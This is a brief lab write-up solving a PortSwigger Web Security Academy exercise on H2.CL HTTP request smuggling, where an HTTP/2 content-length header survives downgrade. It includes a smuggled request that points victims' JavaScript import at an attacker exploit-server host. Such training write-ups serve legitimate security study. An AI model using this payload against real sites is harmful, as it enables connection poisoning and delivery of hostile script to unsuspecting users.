# Lab 19 — H2.CL request smuggling

> **Expert** · [Official lab](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling)

**Entry point:** HTTP/2 requests are downgraded to HTTP/1.1 — an
attacker-controlled `content-length` header survives the downgrade
(H2.CL desync).

## Solution

1. In Repeater (HTTP/2), add a `content-length` header **different** from
   the real body length (Inspector → pseudo-headers/headers, or right-click
   → *Change body* handling).
2. Smuggle a request whose body the front-end mis-frames, poisoning the
   connection right before the victim imports a JavaScript resource
   (timing matters — repeat until the victim executes your JS from the
   exploit server).

```http
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

GET /resources/js/tracking.js HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
...
```

Replace the smuggled GET with a poisoned-redirect chain as in the classic
cache-poisoning smuggling labs — lab solved.

## Notes

H2.CL: the front-end trusts your `content-length` while the back-end reads
by TCP framing — the mismatch is the smuggle.
